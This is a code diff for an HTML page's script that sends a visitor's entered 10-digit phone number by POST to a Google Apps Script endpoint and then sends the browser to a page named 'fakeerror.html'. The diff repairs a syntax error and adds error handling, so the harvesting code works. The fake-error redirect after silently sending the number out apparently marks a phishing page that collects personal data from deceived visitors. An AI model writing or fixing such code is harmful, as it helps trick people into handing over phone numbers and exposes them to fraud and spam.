@@ -48,23 +48,26 @@
   </div>
 
   <script>
-    function submitNumber() {
-      const phone = document.getElementById("phone").value;
-      if (phone.length === 10) {
-        fetch("https://script.google.com/macros/s/AKfycbycGyHuNlquzWpDO56DYGmu-GLtiljn6q3u2GPrlCqDWOJFoY1DSU2ahfUoQdhrcAa6_w/exec", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/x-www-form-urlencoded",
-          },
-          body: "phone=" + encodeURIComponent(phone),
-        })
-        .then(() => {
-          window.location.href = "https://fascinating-bublanina-406853.netlify.app/fakeerror.html";";
-        });
-      } else {
-        alert("Please enter a valid 10-digit phone number.");
-      }
+  function submitNumber() {
+    const phone = document.getElementById("phone").value;
+    if (phone.length === 10) {
+      fetch("https://script.google.com/macros/s/AKfycbycGyHuNlquzWpDO56DYGmu-GLtiljn6q3u2GPrlCqDWOJFoY1DSU2ahfUoQdhrcAa6_w/exec", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded",
+        },
+        body: "phone=" + encodeURIComponent(phone),
+      })
+      .then(() => {
+        window.location.href = "https://fascinating-bublanina-406853.netlify.app/fakeerror.html";
+      })
+      .catch((err) => {
+        alert("Something went wrong: " + err);
+      });
+    } else {
+      alert("Please enter a valid 10-digit phone number.");
     }
-  </script>
+  }
+</script>
 </body>
 </html>
